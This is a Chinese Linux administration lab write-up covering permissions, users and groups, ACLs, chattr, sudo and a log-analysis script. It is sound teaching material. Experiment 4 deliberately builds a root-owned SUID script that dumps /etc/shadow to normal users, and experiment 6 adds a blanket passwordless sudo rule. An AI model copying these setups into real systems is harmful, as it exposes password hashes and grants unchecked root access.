#进入tmp文件夹</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152531969.png"></p><p>②mkdir -p test&#x2F;dir1 test&#x2F;dir2&#x2F;subdir #在当前目录创建一个test父级文件夹，并且创建dir1、dir2子文件夹，并在dir2中创建subdir子文件夹</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152731980.png"></p><p>③cd test&#x2F;dir1 #进入新建的dir1文件夹，touch file1.txt file2.txt #创建file1、file2两个txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152801030.png"></p><p>④touch file3.txt #创建file3.txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152829966.png"></p><p>⑤至此目录结构创建完成</p><p>2、将dir1目录及其内容复制到dir2&#x2F;subdir下</p><p>①cp -r dir1 dir2&#x2F;subdir #将dir1完全复制到subdir下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152855231.png"></p><p>3、查找&#x2F;tmp目录下所有.txt文件并显示详细信息</p><p>①find &#x2F;tmp -type f -name “*.txt” -exec ls -l {} ; #搜索&#x2F;tmp目录下所有txt文件，并执行ls -l命令，{}替换为文件路径</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152920058.png"></p><p>4、将file3.txt移动到dir1目录并重命名为newfile.txt</p><p>①mv test&#x2F;file3.txt test&#x2F;dir1&#x2F;newfile.txt #在tmp目录下，将file3.txt移动到dir1并重命名为newfile.txt，需要绝对路径</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152947625.png"></p><h2 id="实验2：用户与组管理"><a href="#实验2：用户与组管理" class="headerlink" title="实验2：用户与组管理"></a>实验2：用户与组管理</h2><p>1、创建用户user1、user2和组group1</p><p>useradd -m user1#创建user1，创建user2同理，groupadd group1 #创建组group1</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153018280.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153039905.png"></p><p>2、将user1和user2加入group1组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153107450.png"></p><p>3、创建目录&#x2F;shared，设置权限使group1组成员可以读写，其他人无权限</p><p>mkdir shared #创建shared目录</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153126630.png"></p><p>chgrp group1 shared #将目录所属组变为group1，chmod 770 shared #将目录权限改为属组可读写，其他人无权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153144268.png"></p><p>4、验证user1可以在&#x2F;shared中创建文件，user3(非组成员)不能访问</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153210596.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153224472.png"></p><h2 id="实验3：权限管理-UGO"><a href="#实验3：权限管理-UGO" class="headerlink" title="实验3：权限管理(UGO)"></a>实验3：权限管理(UGO)</h2><p>1、创建文件&#x2F;data&#x2F;secret.txt，内容为”Top Secret”</p><p>mkdir &#x2F;data #创建data目录，vim secret.txt #创建secret文件并编写内容</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153256986.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153312410.png"></p><p>2、设置权限：所有者root可读写，组admin可读，其他人无权限</p><p>groupadd admin #创建admin组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153418797.png"></p><p>chgrp admin secret.txt #将文件属组改为admin</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153434104.png"></p><p>chmod 740 secret.txt #设置权限为root可读写，组admin可读，其他无权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153450867.png"></p><p>3、创建用户testuser并尝试访问该文件验证权限</p><p>useradd testuser #创建testuser</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153513883.png"></p><p>su testuser #切换到testuser用户，cat secret.txt #获取文件，验证权限，无法访问，权限不够</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153529921.png"></p><p>4、使用ACL添加testuser的读写权限</p><p>setfacl -m u:testuser:rw- secret.txt #给testuser设置权限，可读写secret.txt</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153548526.png"></p><p>再次切换到testuser，cat secret.txt验证是否能访问，成功访问</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153603961.png"></p><h2 id="实验4：SUID权限应用"><a href="#实验4：SUID权限应用" class="headerlink" title="实验4：SUID权限应用"></a>实验4：SUID权限应用</h2><p>1、创建脚本&#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile，内容为显示&#x2F;etc&#x2F;shadow文件内容</p><p>vim &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh #创建脚本文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153655093.png"></p><p>chmod u+x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh  #给文件设置可执行权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153710345.png"></p><p>2、设置脚本所有者为root并添加SUID权限</p><p>chown root &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh   #设置脚本所有者为root</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153723810.png"></p><p>chmod 4755 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh #设置suid权限，4表示suid，也可使用chmod u+s来设置suid权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153748232.png"></p><p>3、使用普通用户执行该脚本验证权限提升</p><p>su - user1  #切换到普通用户</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153804171.png"></p><p>cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile  #使用命令来验证能否查看脚本内容</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153822790.png"></p><p>成功查看</p><p>4、实验完成后移除SUID权限</p><p>chmod 755 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh  #移除suid权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153840253.png"></p><p>要求：对脚本内容进行注释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#showfile</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash</span></span><br><span class="line"><span class="string">cat /etc/shadow&#x27;</span> &gt; /usr/local/bin/showfile</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/showfile</span><br></pre></td></tr></table></figure><h2 id="实验5：文件属性保护"><a href="#实验5：文件属性保护" class="headerlink" title="实验5：文件属性保护"></a>实验5：文件属性保护</h2><p>1、创建重要配置文件&#x2F;etc&#x2F;important.conf</p><p>touch &#x2F;etc&#x2F;important.conf #创建文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153925705.png"></p><p>2、使用chattr命令防止文件被修改或删除</p><p>chattr +i &#x2F;etc&#x2F;importtant.conf #设置i属性，防止修改删除</p><p>lsattr &#x2F;etc&#x2F;importtant.conf #查看属性</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153944567.png"></p><p>3、尝试修改和删除文件验证保护效果</p><p>rm &#x2F;etc&#x2F;importtant.conf #删除文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153959428.png"></p><p>4、恢复文件正常属性</p><p>chattr &#x3D;表示移除所有属性，移除后进行验证，是否能删除</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154014963.png"></p><p>成功删除</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154028650.png"></p><h2 id="实验6：sudo权限配置"><a href="#实验6：sudo权限配置" class="headerlink" title="实验6：sudo权限配置"></a>实验6：sudo权限配置</h2><p>1、创建用户admin和组sudoadmin</p><p>useradd admin #创建用户，groupadd admin #创建组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154043700.png"></p><p>此时admin用户无法使用sudo无密码执行</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154057227.png"></p><p>2、配置sudo使sudoadmin组成员可以执行所有命令无需密码</p><p>visudo修改配置文件，添加%sudoadmin ALL&#x3D;(ALL:ALL) NOPASSWD: ALL</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154115116.png"></p><p>3、将admin用户加入sudoadmin组</p><p>usermod -aG sudoadmin admin #将用户加入组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154132357.png"></p><p>4、验证admin用户可以使用sudo执行特权命令</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154145543.png"></p><p>成功执行</p><h2 id="实验7：综合权限管理"><a href="#实验7：综合权限管理" class="headerlink" title="实验7：综合权限管理"></a>实验7：综合权限管理</h2><p>1、创建目录&#x2F;project，属组为devteam</p><p>先创建目录和组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154200718.png"></p><p>修改&#x2F;project属组为devteam</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154213425.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154229983.png"></p><p>2、设置权限：组成员可读写，其他人只读</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154256184.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154308399.png"></p><p>3、设置SGID权限使新建文件自动继承组权限</p><p>chmod g+s可设置sgid权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154321067.png"></p><p>4、创建用户dev1、dev2并加入devteam组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154332694.png"></p><p>5、验证dev1创建的文件dev2可以编辑</p><p>切换到dev1用户，在project目录下创建一个1.txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154343649.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154354225.png"></p><p>切换到dev2用户，尝试修改1.txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154409774.png"></p><p>成功执行</p><h3 id="实验8：日志分析与安全审计："><a href="#实验8：日志分析与安全审计：" class="headerlink" title="实验8：日志分析与安全审计："></a>实验8：日志分析与安全审计：</h3><p>1、创建日志文件<br> 将以下内容保存为 <code>/var/log/application.log</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-15 09:10:22 [INFO] User &#x27;admin&#x27; authenticated from 192.168.1.100 (session: SESS-7X2G9P)</span><br><span class="line">2024-03-15 09:11:05 [ERROR] Failed login attempt for user &#x27;root&#x27; from 10.0.0.55 (reason: invalid password)</span><br><span class="line">2024-03-15 09:12:33 [WARNING] High CPU usage detected (92%) on server-node-01</span><br><span class="line">2024-03-15 09:13:17 [SECURITY] Sensitive file accessed: /etc/shadow by user &#x27;backup&#x27;</span><br><span class="line">2024-03-15 09:14:02 [DEBUG] API request: GET /api/v1/users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span><br><span class="line">2024-03-15 09:15:48 [INFO] Payment processed: $250.00 via Credit Card (ref: PAY-8832)</span><br><span class="line">2024-03-15 09:16:30 [ERROR] Database connection timeout (MySQL@10.0.0.100:3306)</span><br><span class="line">2024-03-15 09:17:11 [ALERT] SSH brute force detected from 45.33.12.88 (15 attempts)</span><br></pre></td></tr></table></figure><p>2、设置权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 640 /var/log/application.log</span><br><span class="line">chown root:adm /var/log/application.log</span><br></pre></td></tr></table></figure><p><strong>任务1.1</strong>：统计日志中所有错误事件的数量</p><p><strong>任务1.2</strong>：提取所有包含IP地址的行（仅显示IP）</p><p><strong>任务2.1</strong>：查看<code>SECURITY</code>事件及其前后1行内容</p><p><strong>任务3.1</strong>：找出所有涉及金额的记录（含<code>$</code>符号）</p><p><strong>扩展任务</strong>：提取金额数值并计算总和</p><p>​   时间范围统计：统计09:10-09:15期间的事件数量</p><p><strong>任务4.1</strong>：检测潜在暴力破解行为</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed login\|brute force&quot;</span> /var/log/application.log</span><br></pre></td></tr></table></figure><p>编写自动化脚本，analyzer.sh，并使用chmod +x赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 多功能日志分析工具</span><br><span class="line"># 用法：./analyzer.sh [日志文件路径]</span><br><span class="line"></span><br><span class="line">LOG_FILE=&quot;$&#123;1:-/var/log/syslog&#125;&quot;  # 默认使用syslog，可指定其他文件</span><br><span class="line">TEMP_IP_FILE=&quot;/tmp/ips.tmp&quot;       # IP临时文件</span><br><span class="line">TEMP_AMOUNT_FILE=&quot;/tmp/amounts.tmp&quot; # 金额临时文件</span><br><span class="line"></span><br><span class="line"># 任务1.1: 统计错误事件数量</span><br><span class="line">analyze_errors() &#123;</span><br><span class="line">    echo &quot;===== 任务1.1: 错误事件统计 =====&quot;</span><br><span class="line">    local error_count=$(grep -i -E &quot;error|fail|critical|exception&quot; &quot;$LOG_FILE&quot; | wc -l)</span><br><span class="line">    echo &quot;总错误事件数量: $error_count&quot;</span><br><span class="line">    </span><br><span class="line">    # 错误类型细分</span><br><span class="line">    echo -e &quot;\n错误类型分布:&quot;</span><br><span class="line">    grep -i -o -E &quot;error|fail|critical|exception&quot; &quot;$LOG_FILE&quot; | sort | uniq -c | sort -nr</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务1.2: 提取所有IP地址</span><br><span class="line">extract_ips() &#123;</span><br><span class="line">    echo &quot;===== 任务1.2: IP地址提取 =====&quot;</span><br><span class="line">    # 使用增强IP正则表达式</span><br><span class="line">    grep -E -o &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; &quot;$LOG_FILE&quot; | sort -u &gt; &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">    echo &quot;找到唯一IP地址: $(wc -l &lt; &quot;$TEMP_IP_FILE&quot;)&quot;</span><br><span class="line">    echo -e &quot;\n前10个IP:&quot;</span><br><span class="line">    head -n 10 &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务2.1: 查看SECURITY事件及上下文</span><br><span class="line">show_security_events() &#123;</span><br><span class="line">    echo &quot;===== 任务2.1: SECURITY事件分析 =====&quot;</span><br><span class="line">    local security_count=$(grep -i &quot;SECURITY&quot; &quot;$LOG_FILE&quot; | wc -l)</span><br><span class="line">    echo &quot;找到SECURITY事件: $security_count&quot;</span><br><span class="line">    </span><br><span class="line">    if [ &quot;$security_count&quot; -gt 0 ]; then</span><br><span class="line">        echo -e &quot;\nSECURITY事件及上下文 (前5个):&quot;</span><br><span class="line">        grep -i &quot;SECURITY&quot; -A 1 -B 1 &quot;$LOG_FILE&quot; | head -n 15</span><br><span class="line">    else</span><br><span class="line">        echo &quot;未找到SECURITY事件&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务3.1: 金额记录分析</span><br><span class="line">analyze_amounts() &#123;</span><br><span class="line">    echo &quot;===== 任务3.1: 金额记录分析 =====&quot;</span><br><span class="line">    # 查找所有包含$符号的行</span><br><span class="line">    grep &quot;\$&quot; &quot;$LOG_FILE&quot; &gt; &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">    local amount_count=$(wc -l &lt; &quot;$TEMP_AMOUNT_FILE&quot;)</span><br><span class="line">    echo &quot;找到包含金额的记录: $amount_count&quot;</span><br><span class="line">    </span><br><span class="line">    if [ &quot;$amount_count&quot; -gt 0 ]; then</span><br><span class="line">        # 扩展任务: 提取金额并计算总和</span><br><span class="line">        echo -e &quot;\n金额记录示例 (前5个):&quot;</span><br><span class="line">        head -n 5 &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        # 提取金额数值</span><br><span class="line">        local total_amount=0</span><br><span class="line">        local amounts=()</span><br><span class="line">        while IFS= read -r line; do</span><br><span class="line">            # 匹配$后跟数字/小数点的金额</span><br><span class="line">            if [[ &quot;$line&quot; =~ \$([0-9]+(\.[0-9]&#123;1,2&#125;)?) ]]; then</span><br><span class="line">                amount=&quot;$&#123;BASH_REMATCH[1]&#125;&quot;</span><br><span class="line">                amounts+=(&quot;$amount&quot;)</span><br><span class="line">                total_amount=$(awk &quot;BEGIN &#123;printf \&quot;%.2f\&quot;, $total_amount + $amount&#125;&quot;)</span><br><span class="line">            fi</span><br><span class="line">        done &lt; &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        echo -e &quot;\n金额总和: \$$total_amount&quot;</span><br><span class="line">        echo &quot;提取金额数量: $&#123;#amounts[@]&#125;&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;未找到金额记录&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 扩展任务: 时间范围统计</span><br><span class="line">time_range_analysis() &#123;</span><br><span class="line">    echo &quot;===== 扩展任务: 时间范围统计 (09:10-09:15) =====&quot;</span><br><span class="line">    # 根据日志格式调整时间匹配模式</span><br><span class="line">    local time_count=$(grep -E &quot;09:(1[0-4]|15)&quot; &quot;$LOG_FILE&quot; | wc -l)</span><br><span class="line">    echo &quot;09:10-09:15期间的事件数量: $time_count&quot;</span><br><span class="line">    </span><br><span class="line">    # 显示该时间段的事件类型分布</span><br><span class="line">    echo -e &quot;\n事件类型分布:&quot;</span><br><span class="line">    grep -E &quot;09:(1[0-4]|15)&quot; &quot;$LOG_FILE&quot; | grep -o -E &quot;\[[A-Z]+\]|\b[A-Z]&#123;3,&#125;\b&quot; | sort | uniq -c | sort -nr | head -5</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务4.1: 检测潜在暴力破解</span><br><span class="line">detect_bruteforce() &#123;</span><br><span class="line">    echo &quot;===== 任务4.1: 潜在暴力破解检测 =====&quot;</span><br><span class="line">    # 检测失败的登录尝试</span><br><span class="line">    echo &quot;检测失败的登录尝试...&quot;</span><br><span class="line">    local failed_logins=$(grep -i &quot;fail&quot; &quot;$LOG_FILE&quot; | grep -E &quot;login|auth|ssh&quot;)</span><br><span class="line">    </span><br><span class="line">    if [ -n &quot;$failed_logins&quot; ]; then</span><br><span class="line">        # 提取IP和尝试次数</span><br><span class="line">        echo &quot;$failed_logins&quot; | grep -E -o &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; | sort | uniq -c | sort -nr &gt; &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        local suspicious_count=0</span><br><span class="line">        echo -e &quot;\n登录失败统计:&quot;</span><br><span class="line">        while IFS= read -r line; do</span><br><span class="line">            attempts=$(echo &quot;$line&quot; | awk &#x27;&#123;print $1&#125;&#x27;)</span><br><span class="line">            ip=$(echo &quot;$line&quot; | awk &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">            </span><br><span class="line">            if [ &quot;$attempts&quot; -gt 5 ]; then</span><br><span class="line">                echo &quot;[!] 可疑: IP $ip 有 $attempts 次失败尝试&quot;</span><br><span class="line">                ((suspicious_count++))</span><br><span class="line">            else</span><br><span class="line">                echo &quot;[ ] 正常: IP $ip 有 $attempts 次失败尝试&quot;</span><br><span class="line">            fi</span><br><span class="line">        done &lt; &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        echo -e &quot;\n检测到 $suspicious_count 个可疑IP&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;未找到失败登录记录&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 主函数</span><br><span class="line">main() &#123;</span><br><span class="line">    # 检查日志文件是否存在</span><br><span class="line">    if [ ! -f &quot;$LOG_FILE&quot; ]; then</span><br><span class="line">        echo &quot;错误: 日志文件不存在 - $LOG_FILE&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">    </span><br><span class="line">    echo &quot;===== 开始分析日志: $LOG_FILE =====&quot;</span><br><span class="line">    echo &quot;文件大小: $(du -h &quot;$LOG_FILE&quot; | cut -f1)&quot;</span><br><span class="line">    echo &quot;最后修改: $(stat -c %y &quot;$LOG_FILE&quot;)&quot;</span><br><span class="line">    echo &quot;总行数: $(wc -l &lt; &quot;$LOG_FILE&quot;)&quot;</span><br><span class="line">    echo</span><br><span class="line">    </span><br><span class="line">    # 执行所有分析任务</span><br><span class="line">    analyze_errors</span><br><span class="line">    extract_ips</span><br><span class="line">    show_security_events</span><br><span class="line">    analyze_amounts</span><br><span class="line">    time_range_analysis</span><br><span class="line">    detect_bruteforce</span><br><span class="line">    </span><br><span class="line">    # 清理临时文件</span><br><span class="line">    rm -f &quot;$TEMP_IP_FILE&quot; &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">    </span><br><span class="line">    echo &quot;===== 分析完成 =====&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 执行主函数</span><br><span class="line">main</span><br></pre></td></tr></table></figure><p>执行后如图</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154427410.png"></p><p><strong>任务5.1</strong>：分析脚本文件生成安全事件报告</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;安全事件报告&quot;</span> &gt; report.txt<span class="comment">#输出安全事件报告标题到report中</span></span><br><span class="line"><span class="built_in">date</span> &gt;&gt; report.txt                  <span class="comment">#输出日期到报告中</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== 高风险事件 ===&quot;</span> &gt;&gt; report.txt    <span class="comment">#输出高风险事件标题</span></span><br><span class="line">grep -E <span class="string">&quot;SECURITY|ALERT&quot;</span> /var/log/application.log &gt;&gt; report.txt   <span class="comment">#匹配SECURITY和ALERT事件，并输出到报告中</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== 异常IP列表 ===&quot;</span> &gt;&gt; report.txt <span class="comment">#输出异常IP到报告中 </span></span><br><span class="line">grep -Eo <span class="string">&quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span> /var/log/application.log | <span class="built_in">sort</span> -u &gt;&gt; report.txt    <span class="comment">#匹配IP，并输出到报告中</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154450789.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
